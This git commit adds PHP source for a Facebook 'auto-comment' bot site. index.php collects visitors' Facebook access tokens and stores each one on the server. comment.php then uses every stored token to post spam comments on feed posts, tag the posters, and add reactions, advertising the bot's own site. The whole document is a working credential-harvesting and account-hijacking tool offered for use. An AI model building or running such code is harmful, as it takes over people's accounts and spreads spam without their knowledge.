fe40db7b8627bdb8b1ac2587690aa74c3ecd4e76
hirashaikh <42166588+hirashaikh@users.noreply.github.com>
2018-12-12 12:55:31 +0500

    Add files via upload

---
+++ comment.php
@@ -0,0 +1,97 @@
+﻿<?php
+date_default_timezone_set('Asia/Islamabad');
+$yx=opendir('Token'); 
+while($isi=readdir($yx)){ 
+if($isi != '.' && $isi != '..'){ 
+$token=$isi;
+$stat= json_decode(auto('https://graph.facebook.com/me/home?fields=id,from,comments&limit=02&access_token='.$token),true);
+for($i=1;$i<=count($stat[data]);$i++){
+$x=$stat[data][$i-1][id].'~'; 
+$y= fopen('komen.txt','a'); 
+fwrite($y,$x); fclose($y);
+$nom = $stat[data][$i-1][comments][count]+1;
+$nom = $stat[data][$i-1][comments][count]+1;
+$name= json_decode(auto('https://graph.facebook.com/'.$stat[data][$i-1][from][id].'?fields=name&access_token='.$token),true);
+$nam=$name[name]; $ama= explode(' ',$nam); $nama=$ama[0]; $mr=''.$nama;
+$tags = explode(' ',$stat[data][$i-1][from][id]);
+$tagged_name = ' @['.$tags[0].':1] ';
+$kata= array('
+cinta.php',
+'motivasi.php',
+'motto.php',
+'bijak.php',); 
+$kata=$kata[rand(0,count($kata)-1)]; $katakata= auto('http://ciambar.us.to/'.$kata);
+
+$jam= array('01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','00',);
+$sapa=array(' ',);
+$ucapan = gmdate('H',time()+7*3600); $ucapan = str_replace($jam,$sapa,$ucapan);
+
+$emo=array ('🕊','🦅','🦆','🦉','🐸','🐊','🐢','🦎','🐍','🐲','🐉','🐬','🐟','🐠','🦈','🐌','🦋','🐛','🏵','🌹','🥀','🌺','🌻','🌼','🌷','🌲','🌳','🌴','🌵','✅','✔','☑','🇵🇰',);
+$emoticon=$emo[rand(0,count($emo)-1)];
+
+$hari=array(1=>
+"Monday",
+   "Tuesday",
+      "Wednesday",
+        "Thursday",
+      "Friday",
+   "Saturday",
+"Sunday"
+);
+
+$bulan=array(1=>
+                                "January",
+                            "February",
+                          "March",
+                        "April",
+                      "May",
+                    "June",
+                  "July",
+                "August",
+              "September",
+            "October",
+          "November",
+        "Desember"
+);
+
+$hr = $hari[gmdate('N',time()+60*60*7)];
+$tgl = gmdate('j',time()+60*60*7);
+$bln = 
+$bln = $bulan[gmdate('n',time()+60*60*7)];
+$thn = gmdate('Y',time()+60*60*7);
+$jam = str_replace($rpc,$sapa,gmdate('H',time()+60*60*7));
+$TimeZone="+05:00";
+	$hour=gmdate("H", time() + ($TimeZone * 60 * 60));
+	if ($hour > 20) $greetings = "gσσ∂ иιgнт 😗 ";
+	else if ($hour > 17) $greetings = "gσσ∂ єνєиιиg 😗";
+	elseif ($hour > 11) $greetings = "gσσ∂ αfтєяиσσи 😗 ";
+	elseif ($hour < 12) $greetings = "gσσ∂ мσяиιиg 😗 "; 
+
+
+
+$pesan= array(
+'
+'.$emoticon.' '.$greetings.' '.$tagged_name.' '.$emoticon.'
+
+💚 #TIGERX_BOT 💚
+
+💙 SITE =>>> VK-BOTX,TK 💙',
+'
+❤️ TOP PE AAO 😜 '.$ama[0].' ❤️
+
+💚 #TIGERX_BOT 💚
+
+💙 SITE =>>> VK-BOTX,TK 💙 @[100021495444328:Vishal] 💙
+',
+);
+$pesan=$pesan[rand(0,count($pesan)-1)];
+$message=$pesan;
+
+auto('https://graph.facebook.com/'.$stat[data][$i-1][id].'/comments?message='.urlencode($message).'&access_token='.$token.'&method=POST');
+auto('https://graph.facebook.com/'.$stat[data][$i-1][id].'/reactions?type=LOVE&method=POST&access_token='.$token.'');
+}
+}
+}
+function auto($url){ $data = curl_init(); curl_setopt($data,CURLOPT_RETURNTRANSFER,1); curl_setopt($data,CURLOPT_URL, $url); $hasil = curl_exec($data); curl_close($data); return $hasil;
+}
+?>
---
+++ index.php
@@ -0,0 +1,178 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
+VISHAL KUMAR
+</title><link rel="stylesheet" type="text/css" href="B.css"
+<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet"> 
+<center><div style="font-family: 'Merienda', cursive;
+font-size: 30pt">
+<strong><marquee behavior="alternate"><center><script language="JavaScript" src="B.js"></script></font></center></marquee></strong></br>
+<?php
+$yx=opendir('Token');
+while($isi=readdir($yx)){
+if($isi != '.' && $isi != '..'){
+$member[]=$isi;
+}
+}
+$like = new like();
+if($_GET[act]){
+print '';
+}
+if($_POST[access_token]){
+$access_token = $_POST[access_token];
+$me = $like -> me($access_token);
+if($me[id]){
+$like -> Token($access_token);
+if($_POST[id]){
+$like -> pancal($_POST[id]);
+}else{
+$like -> getData($access_token);
+}
+}else{
+$like -> invalidToken();
+}
+}else{
+$like->form();
+}
+class like {
+public function pancal($id){ for($i=1;$i<4;$i++){
+$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
+}
+print '';
+}
+public function me($access){
+return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
+}
+public function Token($access){
+if(!is_dir('Token')){
+mkdir('Token');
+}
+$a=fopen('Token/'.$access,'w');
+fwrite($a,1);
+fclose($a);
+}
+public function invalidToken(){
+print'<script>window.alert("Your Token is Invalid, Try Again :)");</script>';
+$this->form();
+}
+public function form(){
+ echo '
+ </br>
+ 
+<strong><center><a href="https://facebook.com/topper.vk" alt="Token shaikh" target="_blank"><img src="https://graph.facebook.com/100021495444328/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>
+ </br> </br>
+<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
+<center><div style="font-family: Merienda;
+font-size: 30pt">
+<div id="center">
+
+<center><div style="font-family: Great+Vibes;
+font-size: 30pt"><a href="https://vk-tokenxx.herokuapp.com/" target="_blank">
+
+<input class="button" type="button" value="Get Token"></a></center>
+
+
+<form action="index.php" method="post">
+
+<input class="search" type="text1" style="width:65%" name="access_token" placeholder="Paste Your Access Token Here" required></br>
+
+<input class="submit" type="submit" value="Submit"></form></div>
+</form></center><br>
+</font><br>
+<center><link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
+<center><div style="font-family: Merienda;
+font-size: 30pt">
+<center><script language="JavaScript" src=""></script></font></center>
+<div style="font-family: Merienda;
+<font size="6"><h1> Made By : VISHAL KUMAR</a></h1></b>
+</b></a></center></div></div></body></html>';
+}
+public function getData($access){
+$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
+if(count($feed[data]) >= 1){
+for($i=0;$i<count($feed[data]);$i++){
+$uid = $feed[data][$i][from][id];
+$name = $feed[data][$i][from][name];
+$type = $feed[data][$i][type];
+$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
+$id = $feed[data][$i][id];
+$pic = $feed[data][$i][picture];
+echo'
+
+<center>
+<center> <a href="https://facebook.com/100021495444328" alt="Token shaikh" target="_blank"> <img src="https://graph.facebook.com/100021495444328/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>
+
+<br>
+<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
+<center><div style="font-family: Merienda;
+font-size: 30pt">> 
+<center><script language="JavaScript" src=""></script></font></center>
+<div style="font-family: Great+Vibes;
+<div id="center"><marquee behavior="alternate"> Bot Successfully Activated </marquee>
+
+</br>
+
+<div id="center">
+<strong><center> <font color="white">
+<center>
+<font color="white" size="15">  Token Saved! </font></br>
+[<a href="index.php" value="Click Here">Click Here</a>] TO START BOT</div></center>
+</br>
+</div>
+<center><link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
+<center><div style="font-family: Merienda;
+font-size: 30pt">
+<center><script language="JavaScript" src=""></script></font></center>
+<div style="font-family: Merienda;
+<font size="6"><h1> Made By : VK</a></h1></b>
+</div>
+';
+if($type=='photo'){
+echo'
+';
+}else{
+echo'
+';
+}
+}
+}else{
+print '';
+}
+print '';
+}
+private function _req($url){
+$ch = curl_init();
+curl_setopt_array($ch,array(
+CURLOPT_CONNECTTIMEOUT => 5,
+CURLOPT_RETURNTRANSFER => true,
+CURLOPT_URL => $url,
+) );
+$result = curl_exec($ch);
+curl_close($ch);
+return $result;
+}
+}
+?>
+</body>
+</html>
+<h2>
+<link href="https://fonts.googleapis.com/css?family=Merienda"  rel="stylesheet" type="text/css">
+<center><div style="font-family: Merienda;
+font-size: 30pt">
+<center><script language="JavaScript" src=""></script></font></center>
+<div style="font-family: Merienda;
+<div id="header">
+<font color="MAGENTA"><?php 
+    // integer starts at 0 before counting
+    $i = 0; 
+    $dir = 'Token/';
+    if ($handle = opendir($dir)) {
+        while (($file = readdir($handle)) !== false){
+            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
+                $i++;
+        }
+    }
+    // </strong> prints out how many were in the directory
+    echo "Active Users : $i "; ?></strong>
+</div>
+ <script type="text/javascript" src=""></script>
+<script language="javascript" type="text/javascript" src="ali.js"></script>
+<div class="kddtop"> <div class="kddtut"> <p>
